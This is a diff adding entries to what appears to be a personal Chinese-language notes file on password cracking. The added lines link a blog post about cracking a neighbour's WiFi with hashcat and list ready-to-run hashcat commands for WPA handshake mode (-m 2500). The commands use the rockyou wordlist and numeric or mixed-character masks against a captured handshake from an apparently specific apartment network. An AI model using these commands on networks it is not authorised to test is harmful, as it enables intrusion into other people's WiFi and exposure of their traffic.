@@ -165,6 +165,37 @@ https://cdn.modb.pro/db/122207
 https://zhuanlan.zhihu.com/p/633207702      ############
 2023-05-29 如何使用 hashcat 破解 RAR、ZIP 压缩包密码
 
+用Hashcat每秒计算1.4亿个密码，破解隔壁WIFI密码
+https://www.cnblogs.com/diligenceday/p/6359661.html     ############
+
+-D 1 //1默认cpu，2为gpu…
+hashcat64.exe -m 2500 -D 1 1Anomymous.hccapx rockyou.txt
+
+
+hashcat -m 2500 -a 3 handshake.hccap ?d?d?d?d?d?d?d?d
+
+　　?d?d?d?d?d?d?d?d代表8为数字
+
+下面的意思:用GPU且8位数字掩码来破解34-96-72-0A-0C-DA_handshake.cap.hccap包
+
+
+hashcat64.exe -a 3 -m 2500 G:\wifi\pcap\ziroom301\34-96-72-0A-0C-DA_handshake.cap.hccap ?d?d?d?d?d?d?d?d
+
+
+下面的意思:用GPU且9位大小写字母特殊字符组合的掩码来破解34-96-72-0A-0C-DA_handshake.cap.hccap包
+
+
+hashcat64.exe -a 3 -m 2500 G:\wifi\pcap\ziroom301\34-96-72-0A-0C-DA_handshake.cap.hccap --custom-charset1=?a ?1?1?1?1?1?1?1?1?1
+
+
+
+
+
+
+
+
+
+
 
 
 ---------------------------------------------------------
